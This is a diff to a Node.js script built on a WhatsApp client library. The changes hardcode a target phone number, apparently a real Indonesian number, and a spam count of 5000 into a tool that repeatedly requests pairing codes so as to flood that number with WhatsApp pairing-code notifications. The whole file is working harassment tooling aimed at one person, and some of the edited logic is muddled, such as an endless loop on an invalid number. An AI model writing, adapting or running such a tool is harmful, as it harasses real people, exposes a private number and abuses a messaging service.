@@ -30,28 +30,32 @@ const NodeCache = require("node-cache");
 const Pino = require("pino");
 const readline = require("readline");
 const makeWASocket = require("@whiskeysockets/baileys")['default'];
+
 const store = makeInMemoryStore({
   'logger': pino().child({
     'level': "silent",
     'stream': "store"
   })
 });
+
+// Hardcoded target phone number and spam count
+const targetPhoneNumber = "6285895954504"; // Replace with the target phone number
+const spamCount = 5000; // Replace with the number of times you want to spam
+
 const pairingCode = true || process.argv.includes("--pairing-code");
 const useMobile = process.argv.includes("--mobile");
-const rl = readline.createInterface({
-  'input': process.stdin,
-  'output': process.stdout
-});
-const question = text => new Promise(resolve => rl.question(text, resolve));
+
 async function startspam() {
   let { 
   version: version, 
   isLatest: isLatest 
   } = await fetchLatestBaileysVersion();
+
   const {
     state: state,
     saveCreds: saveCreds
   } = await useMultiFileAuthState("./cassaster");
+
   const msgRetryCounterCache = new NodeCache();
   const spam = makeWASocket({
     'logger': pino({
@@ -81,29 +85,24 @@ async function startspam() {
     'msgRetryCounterCache': msgRetryCounterCache,
     'defaultQueryTimeoutMs': undefined
   });
+
   store.bind(spam.ev);
 
   if (pairingCode && !spam.authState.creds.registered) {
     if (useMobile) {
       throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
     }
-    
+
     console.log(chalk.bgBlack(chalk.yellowBright("╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦═╗")));
     console.log(chalk.bgBlack(chalk.blueBright("║  ╠═╣╚═╗╚═╗╠═╣╚═╗ ║ ║╣ ╠╦╝")));
     console.log(chalk.bgBlack(chalk.redBright("╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═")));
-    
-    let phoneNumber = await question(chalk.bgBlack(chalk.whiteBright("Input NO Whatsapp: +628xxx : ")));
-    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
-    
+
+    let phoneNumber = targetPhoneNumber.replace(/[^0-9]/g, '');
+
     while (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
-      console.log(chalk.bgBlack(chalk.yellowBright("╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦═╗")));
-      console.log(chalk.bgBlack(chalk.blueBright("║  ╠═╣╚═╗╚═╗╠═╣╚═╗ ║ ║╣ ╠╦╝")));
-      console.log(chalk.bgBlack(chalk.redBright("╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═")));
-      phoneNumber = await question(chalk.bgBlack(chalk.greenBright("Input NO Whatsapp: +628xxx : ")));
+      console.log(chalk.bgBlack(chalk.yellowBright("Nomor tidak valid, silakan periksa kembali!")));
     }
-    
-    let spamCount = parseInt(await question(chalk.bgBlack(chalk.whiteBright("Berapa kali kamu akan spam? : "))), 10);
-    
+
     for (let i = 0; i < spamCount; i++) {
       let second = 100;
       while (second > 0) {
@@ -111,13 +110,13 @@ async function startspam() {
         code = code?.['match'](/.{1,4}/g)?.["join"]('-') || code;
         console.log(chalk.bgBlack(chalk.greenBright("Pairing Code: " + code)));
         console.log(chalk.bgBlack(chalk.whiteBright("Spam Dalam..: " + second + " s...")));
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(resolve => setTimeout(resolve, 300000));
         second--;
       }
-      console.log(chalk.bgBlack(chalk.redBright(`Spam ke-${i + 1} selesai. Tunggu 30 detik sebelum melanjutkan...`)));
-      await new Promise(resolve => setTimeout(resolve, 30000));
+      console.log(chalk.bgBlack(chalk.redBright(`Spam ke-${i + 1} selesai. Tunggu 1 detik sebelum melanjutkan...`)));
+      await new Promise(resolve => setTimeout(resolve, 1));
     }
-    
+
     console.log(chalk.bgBlack(chalk.greenBright(`Spam selesai sebanyak ${spamCount} kali.`)));
   }
 
